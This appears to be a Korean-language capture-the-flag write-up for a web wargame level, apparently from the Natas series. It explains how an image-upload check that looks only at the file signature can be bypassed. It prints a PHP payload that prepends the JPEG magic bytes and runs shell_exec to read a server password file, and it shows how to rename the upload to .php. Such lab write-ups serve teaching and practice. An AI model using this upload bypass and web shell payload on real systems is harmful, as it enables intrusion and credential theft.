# Category

web

# Overview

For security reasons, we now only accept image files!

Choose a JPEG to upload (max 1KB):

# Analysis

- `exif_imagetype()` 통한 업로드한 파일의 시그니쳐를 분석하여, 이미지 파일 여부를 판단하고 있으며, `jpg`인 척 속이고 업로드하기 위해 파일의 앞부분만 시그니쳐(`FF D8 FF`)로 변경하면 허용되는 문제가 있다.

- `<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />`코드가 있어 사용자가 올리는 파일의 이름이 `genRandomString()`함수에 따라 10자리 랜덤한 문자열로 변경이 되며, 확장자도 `.jpg`로 고정된다.

  `input` 태그의 `value`를 `.php`로 수정하면 사용자가 올리는 파일이 `.php`로 저장되고 해당 파일을 불러올 때 서버에서는 사용자가 올린 `.php`파일을 실행하게 된다.

# Exploitation

1.  `jpg`파일인 것처럼 속이기 위하여 `php` 코드의 앞부분에 강제로 `jpg` 파일 시그니처(`FF D8 FF`)를 넣어주게 되면 `exif_imagetype()`를 통과할 수가 있다.

    ```bash
    $ xxd solve.php
    00000000: ffd8 ffe0 efbf bdef bfbd efbf bdef bfbd  ................
    ```

    파일 시그니쳐 뒷부분에 서버에 저장되어 있는 비밀번호 읽고 화면에 출력하는 `php` 코드를 추가하고 업로드 한다.

    ```php
    ���������
    <?php
    $output = shell_exec("cat /etc/natas_webpass/natas14");
    echo $output;
    ?>
    ```

2.  업로드 버튼을 누르기 전 `filename`이 지정된 `input` 태그의 `value`값의 확장자를 `.php`로 변경하여 서버에 저장될 때의 확장자를 `.php`로 저장되게 변경한다.

3.  파일 업로드 후 응답에서 `The file upload/RANDOM_10.php has been uploaded`와 같이 사용자의 php파일이 성공적으로 업로드 된 것을 알 수 있으며, 해당 파일을 누르게 되면 서버는 php파일을 인식하고 실행하여 코드에 내용에 따라 다음 비밀번호를 읽어 출력하게 된다.

# Flag

`z3...tQ`
